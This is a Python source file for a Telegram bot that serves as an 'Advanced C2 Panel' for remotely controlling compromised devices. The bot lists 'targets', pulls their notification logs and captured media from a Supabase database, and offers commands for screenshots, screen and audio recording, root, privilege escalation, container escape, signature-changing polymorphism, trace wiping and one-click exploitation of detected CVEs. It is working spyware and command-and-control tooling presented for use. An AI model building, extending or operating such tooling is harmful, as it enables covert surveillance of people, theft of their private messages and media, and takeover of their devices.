# ==================== bot_commands_menu.py ====================
import json
import os
import logging
import threading
import time
from typing import Dict, Any, List, Optional
import telebot
from telebot import types

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class BotMenu:
    def __init__(self, bot: telebot.TeleBot, admin_id: int, supabase_sync=None, zero_day_hunter=None, auth_list=None):
        self.bot = bot
        self.admin_id = admin_id  # Still used for logging, but not for auth checks
        self.auth_list = auth_list  # Shared list of authenticated user IDs
        self.supabase_sync = supabase_sync
        self.zero_day_hunter = zero_day_hunter
        self.dynamic_commands = []
        self.vulnerability_commands = []
        self.log_file = "bot_audit.log"
        self._register_handlers()
        self._start_auto_refresh()

    def _audit_log(self, user_id, action, details):
        log_entry = f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Admin: {user_id} - Action: {action} - Target: {details}\n"
        with open(self.log_file, "a") as f:
            f.write(log_entry)

    def _is_authenticated(self, user_id):
        return user_id in self.auth_list

    def _register_handlers(self):
        @self.bot.message_handler(commands=['start', 'menu'])
        def show_main_menu(message):
            if not self._is_authenticated(message.from_user.id):
                return
            self._refresh_data()
            markup = types.InlineKeyboardMarkup(row_width=3)
            buttons = [
                types.InlineKeyboardButton("📱 Devices", callback_data="menu_devices"),
                types.InlineKeyboardButton("📩 Notifs", callback_data="menu_notifs"),
                types.InlineKeyboardButton("🔞 AI Radar", callback_data="menu_ai_radar"),
                types.InlineKeyboardButton("📸 Media", callback_data="menu_media"),
                types.InlineKeyboardButton("🎥 Live", callback_data="menu_live"),
                types.InlineKeyboardButton("☠️ Adv-Exploit", callback_data="menu_adv"),
                types.InlineKeyboardButton("🔬 Evolve", callback_data="menu_evolve"),
                types.InlineKeyboardButton("📊 OSINT", callback_data="menu_osint"),
                types.InlineKeyboardButton("⚠️ Zero-Day", callback_data="menu_zero_day"),
                types.InlineKeyboardButton("📊 DB Summary", callback_data="menu_db_summary")
            ]
            markup.add(*buttons)
            if self.vulnerability_commands:
                markup.add(types.InlineKeyboardButton("🔥 NEW VULN DETECTED!", callback_data="menu_zero_day"))
            self.bot.send_message(message.chat.id, "🎮 **Advanced C2 Panel**\nSystem Status: *Ready*", parse_mode='Markdown', reply_markup=markup)

        @self.bot.callback_query_handler(func=lambda call: call.data.startswith("menu_"))
        def handle_menu(call):
            if not self._is_authenticated(call.from_user.id):
                return
            cmd = call.data[5:]
            markup = types.InlineKeyboardMarkup(row_width=1)
            back = types.InlineKeyboardButton("🔙 Back", callback_data="menu_main")
            if cmd == "devices":
                text = "📱 **Devices:**\n/list - All targets\n/info [id] - Deep scan"
            elif cmd == "notifs":
                self.list_notifications(call)
                return
            elif cmd == "ai_radar":
                text = "🔞 **AI Radar:**\n/sens_scan [id] - Force scan\n/ai_status [id] - Radar health"
            elif cmd == "media":
                text = "📸 **Media Vault:**\n/gallery [id] - Latest captures\n/download [id] [file_id] - Get file"
            elif cmd == "live":
                text = "🎥 **Live Actions:**\n/record_screen [id] [sec] - Screen record\n/screenshot [id] - Screenshot\n/record_audio [id] [sec] - Audio"
            elif cmd == "adv":
                text = "☠️ **Advanced:**\n⚡ /root [id] - Get root\n⬆️ /privesc [id] - Privilege escalation\n🐳 /escape [id] - Container escape"
            elif cmd == "evolve":
                text = "🔬 **Self-Evolve:**\n🦎 /polymorph - Change signature\n💊 /self_heal - Repair modules\n💀 /destruct [id] - Wipe traces"
            elif cmd == "osint":
                text = "📊 **OSINT:**\n✉️ /osint_email [email]\n📞 /osint_phone [num]\n👤 /osint_user [user]"
            elif cmd == "zero_day":
                text = "⚠️ **Zero-Day Hunter Result:**\n"
                if self.vulnerability_commands:
                    for v in self.vulnerability_commands:
                        text += f"📍 `{v.get('cve', 'N/A')}` -> Target: {v.get('target_app')}\n"
                        markup.add(types.InlineKeyboardButton(f"💥 Exploit {v.get('cve')}", callback_data=f"exploit_{v.get('cve')}"))
                else:
                    text += "_No new vulnerabilities found._"
            elif cmd == "db_summary":
                self.show_db_summary(call)
                return
            else:
                text = "Select action:"
            markup.add(back)
            self.bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

        @self.bot.callback_query_handler(func=lambda call: call.data == "menu_main")
        def back_to_main(call):
            if not self._is_authenticated(call.from_user.id):
                return
            self.bot.delete_message(call.message.chat.id, call.message.message_id)
            show_main_menu(call.message)

        @self.bot.callback_query_handler(func=lambda call: call.data.startswith("exploit_"))
        def handle_direct_exploit(call):
            if not self._is_authenticated(call.from_user.id):
                return
            vuln_cve = call.data.split("_")[1]
            self.bot.answer_callback_query(call.id, f"Exploiting {vuln_cve}...")
            self._audit_log(call.from_user.id, "direct_exploit", vuln_cve)

        @self.bot.callback_query_handler(func=lambda call: call.data.startswith("notif_"))
        def fetch_notification(call):
            if not self._is_authenticated(call.from_user.id):
                return
            notif_id = call.data.split("_")[1]
            try:
                res = self.supabase_sync.client.table('notification_logs').select('*').eq('id', notif_id).execute()
                if res.data:
                    log = res.data[0]
                    content = log.get('content', 'N/A')
                    if len(content) > 4000:
                        content = content[:4000] + "..."
                    msg = (f"📩 **Notification #{notif_id}**\n"
                           f"📱 Device: `{log['device_id']}`\n"
                           f"📝 Content: {content}\n"
                           f"🕒 Time: {log['created_at']}")
                    self.bot.send_message(call.message.chat.id, msg, parse_mode='Markdown')
                else:
                    self.bot.answer_callback_query(call.id, "Not found.")
            except Exception as e:
                self.bot.answer_callback_query(call.id, f"Error: {str(e)[:50]}")
            self.bot.answer_callback_query(call.id)

    def list_notifications(self, call):
        try:
            # Use 'id' instead of '*' for count to reduce load
            res = self.supabase_sync.client.table('notification_logs').select('id, device_id, created_at').order('id', desc=True).limit(10).execute()
            if not res.data:
                self.bot.answer_callback_query(call.id, "No notifications.")
                return
            text = "📩 **Recent notifications (click ID to fetch):**\n"
            markup = types.InlineKeyboardMarkup(row_width=1)
            for log in res.data:
                btn_text = f"ID: {log['id']} | Device: {log['device_id'][:6]}... | {log['created_at'][11:16]}"
                # When clicked, directly fetch the content
                markup.add(types.InlineKeyboardButton(btn_text, callback_data=f"notif_{log['id']}"))
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
            self.bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
        except Exception as e:
            self.bot.answer_callback_query(call.id, f"Error: {str(e)[:50]}")

    def show_db_summary(self, call):
        try:
            # Use 'id' for count to be more efficient
            dev_count = self.supabase_sync.client.table('client_info').select('id', count='exact', head=True).execute().count
            notif_count = self.supabase_sync.client.table('notification_logs').select('id', count='exact', head=True).execute().count
            media_count = self.supabase_sync.client.table('media_captures').select('id', count='exact', head=True).execute().count
            text = (f"📊 **Database Summary**\n\n"
                    f"📱 Devices: `{dev_count}`\n"
                    f"📩 Notifications: `{notif_count}`\n"
                    f"📸 Media: `{media_count}`")
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
            self.bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
        except Exception as e:
            self.bot.answer_callback_query(call.id, f"Error: {str(e)[:50]}")

    def _refresh_data(self):
        if self.zero_day_hunter:
            self.vulnerability_commands = self.zero_day_hunter.get_recent_vulnerabilities()
        if self.supabase_sync:
            self.dynamic_commands = self.supabase_sync.get_available_commands()

    def _start_auto_refresh(self):
        def loop():
            while True:
                self._refresh_data()
                time.sleep(300)
        threading.Thread(target=loop, daemon=True).start()

def setup_bot_menu(bot, admin_id, supabase_sync=None, zero_day_hunter=None, auth_list=None):
    return BotMenu(bot, admin_id, supabase_sync, zero_day_hunter, auth_list)
